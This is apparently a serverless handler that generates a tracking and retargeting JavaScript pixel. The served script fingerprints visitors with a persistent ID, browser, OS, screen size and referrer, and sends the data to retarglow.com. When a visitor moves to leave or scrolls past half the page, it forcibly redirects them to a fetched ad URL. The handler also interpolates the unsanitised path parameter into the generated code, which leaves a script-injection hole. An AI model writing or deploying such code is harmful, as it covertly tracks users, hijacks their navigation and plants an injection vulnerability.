exports.handler = async (event) => {
  const headers = {
    "Content-Type": "application/javascript",
    "Access-Control-Allow-Origin": "*"
  };

  try {
    const id = event.pathParameters?.id || "default-campaign";

    const js = `!function(){
  try {
    var _r = localStorage.getItem("_r");
    _r || (_r = crypto.randomUUID(), localStorage.setItem("_r", _r));

    var data = {
      cid: "${id}",
      u: location.href,
      r: document.referrer || null,
      ua: navigator.userAgent,
      dt: /Mobi|Android/i.test(navigator.userAgent) ? "M" : "D",
      b: (function(){
        var e = navigator.userAgent;
        return e.includes("Chrome") ? "C" : e.includes("Firefox") ? "F" : e.includes("Safari") ? "S" : "U";
      })(),
      os: navigator.platform,
      sr: screen.width + "x" + screen.height,
      cm: { _r: _r }
    };

    fetch("https://retarglow.com/track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    let triggered = false;

    function triggerRedirect(url){
      if (!url || triggered) return;
      triggered = true;
      window.location.href = url;
    }

    async function getAdAndRedirect(){
      if (triggered) return;

      try {
        const res = await fetch("https://retarglow.com/getad", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            u: location.href,
            cm: data.cm,
            country: null
          })
        });

        const json = await res.json();
        if (json.ad_url) {
          const finalUrl = json.ad_url.replace("{{_r}}", _r);
          triggerRedirect(finalUrl);
        }
      } catch (err) {
        console.warn("❌ Ad Fetch Error:", err);
      }
    }

    // Exit intent
    document.addEventListener("mouseout", function (e) {
      if (!e.toElement && !e.relatedTarget && e.clientY <= 0 && !triggered) {
        getAdAndRedirect();
      }
    });

    // Scroll trigger
    window.addEventListener("scroll", function () {
      if (triggered) return;
      if (window.scrollY / document.body.scrollHeight > 0.5) {
        getAdAndRedirect();
      }
    });

  } catch (n) {
    console.error("Pixel Error:", n);
  }
}();`;

    return {
      statusCode: 200,
      headers,
      body: js
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: `console.error("PixelServe error:", ${JSON.stringify(err.message)});`
    };
  }
};
